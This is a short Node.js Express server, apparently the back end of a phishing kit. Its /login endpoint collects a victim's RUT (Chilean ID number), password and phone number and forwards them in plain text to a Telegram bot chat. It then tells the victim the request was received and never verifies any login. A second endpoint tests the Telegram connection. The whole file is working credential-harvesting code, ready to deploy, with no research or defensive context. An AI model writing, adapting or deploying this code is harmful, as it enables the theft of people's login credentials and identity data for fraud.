const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");

const app = express();

// Habilitar CORS
app.use(cors());

// Middleware para parsear JSON
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Credenciales desde variables de entorno en Render
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Endpoint de login
app.post("/login", async (req, res) => {
  const { rut, passwd, telefono } = req.body;

  if (!telefono) {
    return res.status(400).send("❌ El campo 'teléfono' es obligatorio.");
  }

  const mensaje = `Nuevo intento de login:
RUT: ${rut}
Contraseña: ${passwd}
Teléfono: ${telefono}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    const data = await response.json();
    console.log("Telegram API response:", data);

    if (data.ok) {
      res.send("✅ Hemos recibido tu solicitud.");
    } else {
      res.status(500).send(`❌ Error: ${data.description}`);
    }
  } catch (error) {
    console.error("Error enviando a Telegram:", error);
    res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
  }
});

// Endpoint de prueba para Telegram
app.get("/test-telegram", async (req, res) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: "🚀 Prueba de conexión desde Render (login-ob-902p)" })
    });

    const data = await response.json();
    console.log("Telegram API response:", data);

    if (data.ok) {
      res.send("✅ Mensaje de prueba enviado a Telegram.");
    } else {
      res.status(500).send(`❌ Error: ${data.description}`);
    }
  } catch (error) {
    console.error("Error en test-telegram:", error);
    res.status(500).send("❌ No se pudo enviar el mensaje de prueba.");
  }
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});
